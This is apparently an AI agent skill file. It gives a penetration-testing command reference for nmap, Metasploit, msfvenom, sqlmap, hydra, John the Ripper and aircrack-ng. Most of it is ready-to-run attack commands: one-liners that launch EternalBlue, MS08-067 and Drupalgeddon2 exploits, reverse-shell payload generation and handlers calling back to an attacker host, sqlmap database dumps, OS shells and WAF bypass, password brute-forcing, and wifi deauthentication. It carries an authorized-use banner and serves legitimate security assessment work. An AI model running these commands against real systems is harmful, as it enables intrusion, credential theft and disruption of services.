---
name: pentest-commands
description: "Provide a comprehensive command reference for penetration testing tools including network scanning, exploitation, password cracking, and web application testing. Enable quick command lookup during security assessments."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# Pentest Commands

## Purpose

Provide a comprehensive command reference for penetration testing tools including network scanning, exploitation, password cracking, and web application testing. Enable quick command lookup during security assessments.

## Inputs/Prerequisites

- Kali Linux or penetration testing distribution
- Target IP addresses with authorization
- Wordlists for brute forcing
- Network access to target systems
- Basic understanding of tool syntax

## Outputs/Deliverables

- Network enumeration results
- Identified vulnerabilities
- Exploitation payloads
- Cracked credentials
- Web vulnerability findings

## Core Workflow

### 1. Nmap Commands

**Host Discovery:**

```bash
# Ping sweep
nmap -sP 192.168.1.0/24

# List IPs without scanning
nmap -sL 192.168.1.0/24

# Ping scan (host discovery)
nmap -sn 192.168.1.0/24
```

**Port Scanning:**

```bash
# TCP SYN scan (stealth)
nmap -sS 192.168.1.1

# Full TCP connect scan
nmap -sT 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# All ports (1-65535)
nmap -p- 192.168.1.1

# Specific ports
nmap -p 22,80,443 192.168.1.1
```

**Service Detection:**

```bash
# Service versions
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Comprehensive scan
nmap -A 192.168.1.1

# Skip host discovery
nmap -Pn 192.168.1.1
```

**NSE Scripts:**

```bash
# Vulnerability scan
nmap --script vuln 192.168.1.1

# SMB enumeration
nmap --script smb-enum-shares -p 445 192.168.1.1

# HTTP enumeration
nmap --script http-enum -p 80 192.168.1.1

# Check EternalBlue
nmap --script smb-vuln-ms17-010 192.168.1.1

# Check MS08-067
nmap --script smb-vuln-ms08-067 192.168.1.1

# SSH brute force
nmap --script ssh-brute -p 22 192.168.1.1

# FTP anonymous
nmap --script ftp-anon 192.168.1.1

# DNS brute force
nmap --script dns-brute 192.168.1.1

# HTTP methods
nmap -p80 --script http-methods 192.168.1.1

# HTTP headers
nmap -p80 --script http-headers 192.168.1.1

# SQL injection check
nmap --script http-sql-injection -p 80 192.168.1.1
```

**Advanced Scans:**

```bash
# Xmas scan
nmap -sX 192.168.1.1

# ACK scan (firewall detection)
nmap -sA 192.168.1.1

# Window scan
nmap -sW 192.168.1.1

# Traceroute
nmap --traceroute 192.168.1.1
```

### 2. Metasploit Commands

**Basic Usage:**

```bash
# Launch Metasploit
msfconsole

# Search for exploits
search type:exploit name:smb

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOST 192.168.1.1

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Run exploit
exploit
```

**Common Exploits:**

```bash
# EternalBlue
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.1; exploit"

# MS08-067 (Conficker)
msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; exploit"

# vsftpd backdoor
msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.1.1; exploit"

# Shellshock
msfconsole -x "use exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST 192.168.1.1; exploit"

# Drupalgeddon2
msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOST 192.168.1.1; exploit"

# PSExec
msfconsole -x "use exploit/windows/smb/psexec; set RHOST 192.168.1.1; set SMBUser user; set SMBPass pass; exploit"
```

**Scanners:**

```bash
# TCP port scan
msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; run"

# SMB version scan
msfconsole -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run"

# SMB share enumeration
msfconsole -x "use auxiliary/scanner/smb/smb_enumshares; set RHOSTS 192.168.1.0/24; run"

# SSH brute force
msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run"

# FTP brute force
msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run"

# RDP scanning
msfconsole -x "use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS 192.168.1.0/24; run"
```

**Handler Setup:**

```bash
# Multi-handler for reverse shells
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; set LPORT 4444; exploit"
```

**Payload Generation (msfvenom):**

```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf > shell.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=4444 -f raw > shell.php

# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f asp > shell.asp

# WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f war > shell.war

# Python payload
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.2 LPORT=4444 -f raw > shell.py
```

### 3. Nikto Commands

```bash
# Basic scan
nikto -h http://192.168.1.1

# Comprehensive scan
nikto -h http://192.168.1.1 -C all

# Output to file
nikto -h http://192.168.1.1 -output report.html

# Plugin-based scans
nikto -h http://192.168.1.1 -Plugins robots
nikto -h http://192.168.1.1 -Plugins shellshock
nikto -h http://192.168.1.1 -Plugins heartbleed
nikto -h http://192.168.1.1 -Plugins ssl

# Export to Metasploit
nikto -h http://192.168.1.1 -Format msf+

# Specific tuning
nikto -h http://192.168.1.1 -Tuning 1  # Interesting files only
```

### 4. SQLMap Commands

```bash
# Basic injection test
sqlmap -u "http://192.168.1.1/page?id=1"

# Enumerate databases
sqlmap -u "http://192.168.1.1/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://192.168.1.1/page?id=1" -D database --tables

# Dump table
sqlmap -u "http://192.168.1.1/page?id=1" -D database -T users --dump

# OS shell
sqlmap -u "http://192.168.1.1/page?id=1" --os-shell

# POST request
sqlmap -u "http://192.168.1.1/login" --data="user=admin&pass=test"

# Cookie injection
sqlmap -u "http://192.168.1.1/page" --cookie="id=1*"

# Bypass WAF
sqlmap -u "http://192.168.1.1/page?id=1" --tamper=space2comment

# Risk and level
sqlmap -u "http://192.168.1.1/page?id=1" --risk=3 --level=5
```

### 5. Hydra Commands

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# HTTP Basic Auth
hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin/

# SMB brute force
hydra -l admin -P passwords.txt smb://192.168.1.1

# RDP brute force
hydra -l admin -P passwords.txt rdp://192.168.1.1

# MySQL brute force
hydra -l root -P passwords.txt mysql://192.168.1.1

# Username list
hydra -L users.txt -P passwords.txt ssh://192.168.1.1
```

### 6. John the Ripper Commands

```bash
# Crack password file
john hash.txt

# Specify wordlist
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john hash.txt --show

# Specify format
john hash.txt --format=raw-md5
john hash.txt --format=nt
john hash.txt --format=sha512crypt

# SSH key passphrase
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# ZIP password
zip2john file.zip > zip_hash.txt
john zip_hash.txt
```

### 7. Aircrack-ng Commands

```bash
# Monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### 8. Wireshark/Tshark Commands

```bash
# Capture traffic
tshark -i eth0 -w capture.pcap

# Read capture file
tshark -r capture.pcap

# Filter by protocol
tshark -r capture.pcap -Y "http"

# Filter by IP
tshark -r capture.pcap -Y "ip.addr == 192.168.1.1"

# Extract HTTP data
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
```

## Quick Reference

### Common Port Scans

```bash
# Quick scan
nmap -F 192.168.1.1

# Full comprehensive
nmap -sV -sC -A -p- 192.168.1.1

# Fast with version
nmap -sV -T4 192.168.1.1
```

### Password Hash Types

| Mode | Type |
|------|------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | sha512crypt |
| 3200 | bcrypt |
| 13100 | Kerberoast |

## Constraints

- Always have written authorization
- Some scans are noisy and detectable
- Brute forcing may lock accounts
- Rate limiting affects tools

## Examples

### Example 1: Quick Vulnerability Scan

```bash
nmap -sV --script vuln 192.168.1.1
```

### Example 2: Web App Test

```bash
nikto -h http://target && sqlmap -u "http://target/page?id=1" --dbs
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Scan too slow | Increase timing (-T4, -T5) |
| Ports filtered | Try different scan types |
| Exploit fails | Check target version compatibility |
| Passwords not cracking | Try larger wordlists, rules |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
